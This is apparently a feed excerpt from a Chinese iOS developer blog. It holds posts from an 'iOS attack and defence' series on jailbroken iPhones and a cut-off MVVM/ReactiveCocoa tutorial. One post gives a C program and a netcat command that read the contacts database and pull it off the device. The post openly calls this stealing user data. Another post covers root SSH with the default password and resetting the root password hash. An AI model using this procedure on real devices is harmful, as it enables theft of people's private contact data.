<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">onDemand</td>
<td style="text-align:left">A boolean flag that defines if a job runs continuously or not</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">RootDirectory</td>
<td style="text-align:left">The job will be?chrooted?into another directory</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">ServiceIPC</td>
<td style="text-align:left">Whether the daemon can speak IPC to launchd</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">WatchPaths</td>
<td style="text-align:left">Allows launchd to start a job based on modifications at a file-system path</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">QueueDirectories</td>
<td style="text-align:left">Similar to WatchPath, a queue will only watch an empty directory for new files</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">StartInterval</td>
<td style="text-align:left">Used to schedule a job that runs on a repeating schedule. Specified as the number of seconds to wait between runs.</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">StartCalendarInterval</td>
<td style="text-align:left">Job scheduling. The syntax is similar to cron.</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">HardResourceLimits</td>
<td style="text-align:left">Controls restriction of the resources consumed by any job</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">LowPriorityIO</td>
<td style="text-align:left">Tells the kernel that this task is of a low priority when doing file system I/O</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">Sockets</td>
<td style="text-align:left">An array can be used to specify what socket the daemon will listen on for launch on demand</td>
<td style="text-align:center">no</td>
</tr>
</tbody>
</table>
<p>iOS基本类似，我基本是参照这个来的。</p>
<p>所以上面的plist实际上是要求系统启动一个进程。<br>一个名为<code>hack</code>的进程，可执行文件的路径是/usr/bin/hack。</p>
<h2 id="3-编写读取通讯录数据程序"><a href="#3-编写读取通讯录数据程序" class="headerlink" title="3. 编写读取通讯录数据程序"></a>3. 编写读取通讯录数据程序</h2><p>iTunes Store的数据都在<code>/var/mobile/Library/AddressBook/AddressBook.sqlitedb</code>中，只要能能拿出AddressBook.sqlitedb就可以非法拿到用户的数据。</p>
<p>那么现在编写一个程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;   </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;   </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;   </span></span></div><div class="line">   </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE <span class="meta-string">"/var/mobile/Library/AddressBook/AddressBook.sqlitedb"</span>   </span></div><div class="line">   </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;   </div><div class="line">    <span class="keyword">int</span> fd = open(FILE, O_RDONLY);   </div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];   </div><div class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;   </div><div class="line">       </div><div class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)   </div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;   </div><div class="line">    <span class="keyword">while</span> (( ret = read(fd, buf, <span class="keyword">sizeof</span>(buf))) &gt; <span class="number">0</span>)&#123;   </div><div class="line">        write( fileno(<span class="built_in">stdout</span>), buf, ret);   </div><div class="line">    &#125;   </div><div class="line">    close(fd);   </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>用同样的方法编译、传输：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xcrun -sdk iphoneos clang -arch armv7 -o hack hack.c</div></pre></td></tr></table></figure>
<p>签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ldid -S hack</div><div class="line">mv hack /usr/bin</div></pre></td></tr></table></figure>
<h2 id="4-抓取-iTunesstore-数据信息"><a href="#4-抓取-iTunesstore-数据信息" class="headerlink" title="4. 抓取 iTunesstore 数据信息"></a>4. 抓取 iTunesstore 数据信息</h2><p>利用netcat，指定之前定义的服务名称，抓取设备 iTunesstore 信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 192.168.31.152 55 &gt; itunesstored2.sqlitedb</div></pre></td></tr></table></figure>
<p>OK，在MAC查看一下内容。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#99;&#111;&#100;&#x65;&#114;&#102;&#x69;&#x73;&#104;&#64;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#109;">&#99;&#111;&#100;&#x65;&#114;&#102;&#x69;&#x73;&#104;&#64;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#109;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h1&gt;&lt;p&gt;2016年7月15更新，最近试了一下，发现用nc拿不到数据了，拿数据的代码是没有问题的，直接运行可以拿到数据，但是从mac通过IP和端口拿到的.sqlitedb文件是空文件，博主也正在看为什么~大家有兴趣可以一起找一下原因。&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;本文章基于念茜的iOS攻防系列。&lt;br&gt;本文将会讲解如何窃取用户的通讯录信息。&lt;br&gt;同样在越狱手机环境下。&lt;/p&gt;
&lt;h1 id=&quot;hack&quot;&gt;&lt;a href=&quot;#hack&quot; class=&quot;headerlink&quot; title=&quot;hack&quot;&gt;&lt;/a&gt;hack&lt;/h1&gt;&lt;h2 id=&quot;1-需要一个plist&quot;&gt;&lt;a href=&quot;#1-需要一个plist&quot; class=&quot;headerlink&quot; title=&quot;1. 需要一个plist&quot;&gt;&lt;/a&gt;1. 需要一个plist&lt;/h2&gt;&lt;p&gt;需要这样一个plist，它看起来是这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
      <category term="iOS攻防" scheme="http://zhoulingyu.com/categories/iOS/iOS%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="iOS攻防" scheme="http://zhoulingyu.com/tags/iOS%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>iOS攻防——（一）ssh登陆与交叉编译</title>
    <link href="http://zhoulingyu.com/2016/07/11/iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"/>
    <id>http://zhoulingyu.com/2016/07/11/iOS攻防——（一）ssh登陆与交叉编译/</id>
    <published>2016-07-11T20:49:11.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>iOS攻防系列大家耳熟能详的是我们iOS女神念茜的系列文章。博主在看了之后也进行了一系列的学习和尝试。念茜的文章写的比较早，有很多文章中提到的东西已经不再适合现在使用，写的也不算详细，很多地方一笔带过，却不是那么好探索。在中间也有很多摸索的过程。<br>所以本系列文章算是对念茜iOS攻防系列的一个补充，中间细节的地方也会写的更加详尽。</p>
<h1 id="你需要一部越狱手机"><a href="#你需要一部越狱手机" class="headerlink" title="你需要一部越狱手机"></a>你需要一部越狱手机</h1><p>首先要做的事，找一部越狱后的iPhone，攻防方面的探索很多需要借助越狱手机的帮助。作为平常的消遣和研究你也应该有一部越狱手机，我的越狱手机是iPhone4，比较古老，但是研究够用了。</p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>首先是手机（前面说过了）。其次，越狱手机大家都知道一个app——Cydia，在上面可以下载所有的越狱APP，相当于越狱后的app store。对于iOS攻防，首先需要以下软件：</p>
<ol>
<li>openSSH</li>
<li>LLVM+Clang</li>
</ol>
<p>可能还需要的软件：</p>
<ol>
<li>Cydia Translations</li>
<li>Cydia Substrate</li>
<li>Cydia Installer</li>
</ol>
<p>这些软件都可以在Cydia下载到，如果你搜索不到，那么你需要添加一些源<br>在Cydia的软件源中点击『编辑』-&gt;『添加』，依次添加以下源</p>
<blockquote>
<ol>
<li><a href="http://yuan.duowan.com" target="_blank" rel="external">http://yuan.duowan.com</a> - 多玩源</li>
<li><a href="http://apt.thebigboss.org/repofiles/cydia/" target="_blank" rel="external">http://apt.thebigboss.org/repofiles/cydia/</a></li>
</ol>
</blockquote>
<a id="more"></a>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-01.PNG-w375" alt=""><br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-02.PNG-w375" alt=""><br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-03.PNG-w375" alt=""></p>
<h1 id="hacking"><a href="#hacking" class="headerlink" title="hacking"></a>hacking</h1><h2 id="1-ssh登陆手机"><a href="#1-ssh登陆手机" class="headerlink" title="1. ssh登陆手机"></a>1. ssh登陆手机</h2><p>ssh登陆，大家应该不算陌生，如果你第一次听说，你可以简单理解成『远程登录』，可以通过一台设备远程登陆另一台设备。</p>
<ol>
<li>保证你的Mac和iPhone在同一网段</li>
<li>确定iPhone的IP</li>
<li>远程登陆</li>
</ol>
<p>在你mac的Terminal输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh root@xxx.xxx.xxx.xxx</div></pre></td></tr></table></figure>
<p>接着会提醒你是否连接，输入yes继续，输入密码，初始密码是<code>alpine</code>。<br>建议你将改密码改掉，因为这样很不安全，在默认密码的情况下，任何人都可以尝试登陆你的设备。<br>在登录之后，你可以更改你的密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">passwd root</div></pre></td></tr></table></figure>
<p>ssh登陆后，可以试着看看手机的目录结构<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-05.png" alt=""></p>
<h2 id="2-交叉编译"><a href="#2-交叉编译" class="headerlink" title="2. 交叉编译"></a>2. 交叉编译</h2><p>首先解释一下什么是交叉编译。交叉编译指在一个平台上生成另一个平台上的可执行代码。<br>我们将会在MAC上写代码，但要生成的可执行文件需要在iPhone上运行。<br>编译是由编译器完成的，所以我们首先要找到合适的编译器。</p>
<p>我们本次的任务就是写一个简单的C程序，能在iPhone上跑的C程序。</p>
<p>念茜所提到的arm-apple-darwin10-llvm-gcc-4.2我是没有找到的，因为这东西好像是在Xcode5的时候才有。</p>
<p>我用的是Clang，所以我们需要下载一下Clang。Clang是一个C语言、C++、Objective-C、C++语言的轻量级编译器。<a href="http://clang.llvm.org/get_started.html" target="_blank" rel="external">这里是传送门</a></p>
<h3 id="1-写经典HelloWorld"><a href="#1-写经典HelloWorld" class="headerlink" title="1. 写经典HelloWorld"></a>1. 写经典HelloWorld</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span>                                                                                               </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;   </div><div class="line">       <span class="built_in">printf</span>(<span class="string">"Hello world !!!\n"</span>);   </div><div class="line">       <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="2-编译"><a href="#2-编译" class="headerlink" title="2. 编译"></a>2. 编译</h3><p>命令台编译：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">touch helloworld.c</div><div class="line">open helloworld.c</div><div class="line">...（写一下代码）</div><div class="line">xcrun -sdk iphoneos clang -arch armv7 -o helloworld helloworld.c</div></pre></td></tr></table></figure>
<p>用过自动打包ipa的同学都对xcrun和xcodebuild很熟悉。这与打包过程类似。</p>
<p>格式：<code>xcrun -sdk iphoneos clang -arch armv7 -o [目标文件名] [源文件名]</code></p>
<p>生成可在iPhone平台运行的二进制可执行文件</p>
<h3 id="3-放到iPhone中"><a href="#3-放到iPhone中" class="headerlink" title="3. 放到iPhone中"></a>3. 放到iPhone中</h3><p>通过ssh文件传输将helloworld传到iPhone中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp helloworld root@192.168.31.152:helloworld</div></pre></td></tr></table></figure>
<p>再看一下iPhone文件目录，是不是已经有了helloworld<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-06.png" alt=""></p>
<p>运行一下：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-07.png" alt=""></p>
<p>Bingo！</p>
<p>如果你继续玩，你会发现其实你的iPhone就是一个类Linux系统（本来就是Unix~~），你可以随便玩。</p>
<h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><h2 id="1-重置ssh登陆密码"><a href="#1-重置ssh登陆密码" class="headerlink" title="1. 重置ssh登陆密码"></a>1. 重置ssh登陆密码</h2><p>如果你不幸忘记了ssh密码，可以在Cydia中下载ifile软件，通过ifile找到/private/etc/master.password文件，文件中会有以下一段：</p>
<blockquote>
<p>root:xxxxxxxxxxxxx:0:0::0:0:System<br>Administrator:/var/root:/bin/sh<br>mobile:xxxxxxxxxxxxx:501:501::0:0:Mobile<br>User:/var/mobile:/bin/sh</p>
</blockquote>
<p>将root:及mobile:后面的13个x字符处修改成<code>/smx7MYTQIi2M</code>，修改后保存此文件，你iphone的ssh密码就重新回到默认的alpine</p>
<h1 id="下期内容"><a href="#下期内容" class="headerlink" title="下期内容"></a>下期内容</h1><p>只是写个HelloWorld是不是很无聊，下一期内容将会教你如何<strong>非法窃取iTunesstore信息</strong>以及<strong>Cycript修改运行时</strong>。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#99;&#111;&#100;&#x65;&#x72;&#102;&#105;&#115;&#x68;&#64;&#x31;&#x36;&#51;&#46;&#x63;&#111;&#109;">&#99;&#111;&#100;&#x65;&#x72;&#102;&#105;&#115;&#x68;&#64;&#x31;&#x36;&#51;&#46;&#x63;&#111;&#109;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;iOS攻防系列大家耳熟能详的是我们iOS女神念茜的系列文章。博主在看了之后也进行了一系列的学习和尝试。念茜的文章写的比较早，有很多文章中提到的东西已经不再适合现在使用，写的也不算详细，很多地方一笔带过，却不是那么好探索。在中间也有很多摸索的过程。&lt;br&gt;所以本系列文章算是对念茜iOS攻防系列的一个补充，中间细节的地方也会写的更加详尽。&lt;/p&gt;
&lt;h1 id=&quot;你需要一部越狱手机&quot;&gt;&lt;a href=&quot;#你需要一部越狱手机&quot; class=&quot;headerlink&quot; title=&quot;你需要一部越狱手机&quot;&gt;&lt;/a&gt;你需要一部越狱手机&lt;/h1&gt;&lt;p&gt;首先要做的事，找一部越狱后的iPhone，攻防方面的探索很多需要借助越狱手机的帮助。作为平常的消遣和研究你也应该有一部越狱手机，我的越狱手机是iPhone4，比较古老，但是研究够用了。&lt;/p&gt;
&lt;h1 id=&quot;前期准备&quot;&gt;&lt;a href=&quot;#前期准备&quot; class=&quot;headerlink&quot; title=&quot;前期准备&quot;&gt;&lt;/a&gt;前期准备&lt;/h1&gt;&lt;p&gt;首先是手机（前面说过了）。其次，越狱手机大家都知道一个app——Cydia，在上面可以下载所有的越狱APP，相当于越狱后的app store。对于iOS攻防，首先需要以下软件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;openSSH&lt;/li&gt;
&lt;li&gt;LLVM+Clang&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可能还需要的软件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Cydia Translations&lt;/li&gt;
&lt;li&gt;Cydia Substrate&lt;/li&gt;
&lt;li&gt;Cydia Installer&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这些软件都可以在Cydia下载到，如果你搜索不到，那么你需要添加一些源&lt;br&gt;在Cydia的软件源中点击『编辑』-&amp;gt;『添加』，依次添加以下源&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://yuan.duowan.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://yuan.duowan.com&lt;/a&gt; - 多玩源&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://apt.thebigboss.org/repofiles/cydia/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://apt.thebigboss.org/repofiles/cydia/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
      <category term="iOS攻防" scheme="http://zhoulingyu.com/categories/iOS/iOS%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="iOS攻防" scheme="http://zhoulingyu.com/tags/iOS%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>iOS——教你如何使用ReactiveCocoa和MVVM为代码解耦构建清爽APP</title>
    <link href="http://zhoulingyu.com/2016/05/20/iOS%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReactiveCocoa%E5%92%8CMVVM%E4%B8%BA%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%80%A6%E6%9E%84%E5%BB%BA%E6%B8%85%E7%88%BDAPP/"/>
    <id>http://zhoulingyu.com/2016/05/20/iOS——教你如何使用ReactiveCocoa和MVVM为代码解耦构建清爽APP/</id>
    <published>2016-05-20T12:39:44.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-MVVM简介"><a href="#1-MVVM简介" class="headerlink" title="1. MVVM简介"></a>1. MVVM简介</h1><p>不过多赘述MVC，用最通俗的方式解说MVVM。</p>
<ol>
<li>拆解：<ol>
<li><strong>M：</strong> <code>Model</code> ，包括数据模型、访问数据库的操作和网络请求等</li>
<li><strong>V：</strong> <code>View</code> ，包括了iOS中的 <code>View</code> 和 <code>controller</code> 组成，负责 UI 的展示，绑定 viewModel 中的属性</li>
<li><strong>VM：</strong> <code>ViewModel</code> ，负责从 <code>Model</code> 中获取 <code>View</code> 所需的数据，转换成 <code>View</code> 可以展示的数据，并暴露公开的属性和命令供 <code>View</code> 进行绑定</li>
<li><strong>Binder：</strong>这是我最近发现的，在标准MVVM中没有提到的一部分，但是如果使用MVVM + ReactiveCocoa就会自然地写出这一层。这一层主要为了实现响应式编程的功能，实现 <code>View</code> 和  <code>ViewModel</code> 的同步</li>
</ol>
</li>
</ol>
<a id="more"></a>
<ol>
<li><p>MVC——&gt;MVVM：</p>
<p> MVC是苹果官方推荐的开发模式，但是伴随这这模式产生的问题非常的多，这是随着项目的逐渐扩大、架构的逐渐复杂显示出来的，这也是为什么MVC也被调侃成<strong>Massive View Controller（重量级视图控制器）</strong>。大多数情况下，小型项目MVC开发不会带来太大的负担，即使你将大量的逻辑代码（不包括通用的工具类逻辑）放在了ViewController中，但只要该部分由一个人维护，相对来说还是可以保持逻辑清晰的。</p>
<p> 但当项目越来越大时，或者一个模块会有多个人维护时，读代码变成了一件非常困难的事，并且，MVC模式的iOS开发一直存在<strong>难以测试</strong>的问题。博主在做JAVA开发时JUnit的测试就像每天的必修课一样。开始iOS开发后，加上第二家公司一直没有QA，线上发现的BUG简直就是每天的噩梦。MVVM带来的好处是 <code>VM</code> 层可以<strong>方便的做测试</strong>，因为 <code>VM</code> 层是<strong>独立的逻辑</strong>，脱离对 <code>View</code> 和 <code>Model</code> 的依赖。</p>
<p> 少写字，多写代码，赶紧进入下一部分介绍，尽快去了解如何编码。</p>
</li>
</ol>
<h1 id="2-ReactiveCocoa"><a href="#2-ReactiveCocoa" class="headerlink" title="2. ReactiveCocoa"></a>2. ReactiveCocoa</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h2><ol>
<li><p><strong>简介：</strong>ReactiveCocoa简称RAC，集合了<strong>函数式编程</strong>和<strong>响应式编程</strong>，这也是为什么ReactiveCocoa被描述为函数响应式编程（FRP）框架。</p>
</li>
<li><p>ReactiveCocoa解决的问题：iOS开发中有多种事件处理方式，相信你一定也曾想过这些坑爹的地方，通常有这些事件处理方式：Action、delegate、Notification、KVO。并且通常这些代码总是散落在代码的各个角落，几度分散。ReactiveCocoa为事件提供了很多处理方法，可以把要处理的事情，和监听的事情的代码放在一起，非常方便管理。</p>
</li>
<li>关于ReactiveCocoa的基本用法，希望你能认真的阅读<a href="http://www.jianshu.com/p/87ef6720a096#" target="_blank" rel="external">这篇博文</a></li>
</ol>
<h2 id="2-2-常用宏"><a href="#2-2-常用宏" class="headerlink" title="2.2 常用宏"></a>2.2 常用宏</h2><ol>
<li><strong><code>RAC(TARGET, [KEYPATH, [NIL_VALUE]])：</code></strong>用于给某个对象的某个属性绑定。</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 文本框文字改变时修改label的文字</span></div><div class="line">    RAC(<span class="keyword">self</span>.labelView,text) = _textField.rac_textSignal;</div></pre></td></tr></table></figure>
<ol>
<li><code>**RACObserve(self, name)：**</code>监听某个对象的某个属性,返回的是信号，可以用来代替KVO</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[RACObserve(<span class="keyword">self</span>.view, center) subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"%@"</span>,x);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<h1 id="3-实践"><a href="#3-实践" class="headerlink" title="3. 实践"></a>3. 实践</h1><h2 id="3-1-实现内容"><a href="#3-1-实现内容" class="headerlink" title="3.1 实现内容"></a>3.1 实现内容</h2><p>做一个简单的登陆功能，两个输入框，一个登陆按钮。<br>简单的用户名密码验证，要求都在6位数以上即可，不符合要求时禁用登陆按钮。</p>
<h2 id="3-2-Coding"><a href="#3-2-Coding" class="headerlink" title="3.2 Coding"></a>3.2 Coding</h2><h3 id="界面大概是这样的感觉，简单的拉一个即可："><a href="#界面大概是这样的感觉，简单的拉一个即可：" class="headerlink" title="界面大概是这样的感觉，简单的拉一个即可："></a>界面大概是这样的感觉，简单的拉一个即可：</h3><p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReactiveCocoa%E5%92%8CMVVM%E4%B8%BA%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%80%A6%E6%9E%84%E5%BB%BA%E6%B8%85%E7%88%BDAPP-01.PNG-w375" alt="禁用登录"><br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReactiveCocoa%E5%92%8CMVVM%E4%B8%BA%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%80%A6%E6%9E%84%E5%BB%BA%E6%B8%85%E7%88%BDAPP-01.PNG-w375" alt="启用登录"></p>
<h3 id="M层"><a href="#M层" class="headerlink" title="M层"></a>M层</h3><p>抽出简单的User模型，Thin Model，不包含功能型方法：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">User</span> : <span class="title">NSObject</span></span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *username;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *password;</div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<h3 id="VM层"><a href="#VM层" class="headerlink" title="VM层"></a>VM层</h3><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"ReactiveCocoa.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">LoginViewModel</span> : <span class="title">NSObject</span></span></div><div class="line"></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span>   *userName;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span>   *password;</div><div class="line"><span class="comment">// 成功信号</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSubject *successSubject;</div><div class="line"><span class="comment">// 失败信号</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSubject *failureSubject;</div><div class="line"><span 